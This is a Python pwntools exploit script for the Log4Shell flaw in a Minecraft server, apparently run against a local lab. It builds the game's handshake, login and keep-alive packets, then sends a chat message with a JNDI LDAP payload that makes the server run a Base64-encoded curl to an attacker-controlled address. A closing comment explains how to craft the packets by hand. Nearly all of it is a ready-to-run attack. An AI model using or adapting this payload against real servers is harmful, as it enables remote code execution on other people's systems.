from pwn import *
ip = 'localhost'
port = 25565
username = 'anything'
message = 'testing ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/Y3VybCAxNzIuMTcuMC4xOjkwMDk=}'
def pack_varint(val):
	total = b''
	if val < 0:
		val = (1<<32)+val
	while val>=0x80:
		bits = val&0x7F
		val >>= 7
		total += struct.pack('B', (0x80|bits))
	bits = val&0x7F
	total += struct.pack('B', bits)
	return total

p = remote('127.0.0.1', port)
handshake = b'\x00\xf2\x05'+len(ip).to_bytes(1,'little')+ip.encode('utf-8')+struct.pack('>H', port)+b'\x02'
p.send(len(handshake).to_bytes(1,'little') +handshake)
print('Sent Handshake')
login_start = b'\x00'+len(username).to_bytes(1, 'little')+username.encode('utf-8')
p.send((2+len(username)).to_bytes(1, 'little')+login_start)
print('Sent Login Start')
junk = p.recvuntil(b'\x0a\x00\x1f')
ka = p.recv(8)
p.send(b'\x0a\x00\x10'+ka)
print('Sent Keep Alive')
p.send((len(message)+2+len(pack_varint(len(message)))).to_bytes(1,'little')+b'\x00\x03'+pack_varint(len(message))+message.encode('utf-8'))
sleep(5)
p.close()

'''
Manual Exploitation/More Info
Raw bytes to send:
Packet format: 2+packet info
Null Packet for compression use, ignore as it's always null
Packet ID: one byte found at wiki.vg
Packet Info: Actual packet data


Handshake:
data_len+0x00+proto_version_VarInt+addr_size_VarInt+addr_utf8+port_VarInt+0x02
p.send(b'\x10\x00\xf2\x05\x09\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74\x06\xdd\x02')
Login Start
data_len+0x00+username_size_VarInt+username_utf8
p.send(b'\x06\x00\x04\x6e\x6e\x6e\x6e')
MUST SEND KEEPALIVE
Keep Alive:
data_len+0x10+keep_alive_long 
keep_alive_long is randomly generated by the server and sent every 10 or so seconds
p.recvuntil(b'\x0a\x00\x1f')
ka = p.recv(8)
p.send(b'\x0a\x00\x10'+ka)
Chat message (must be under 128 characters):
data_len+0x03+chatmsg_size_VarInt+chatmsg_utf8
p.send(b'\x07\x00\x03\x04\x61\x61\x61\x61')
'''
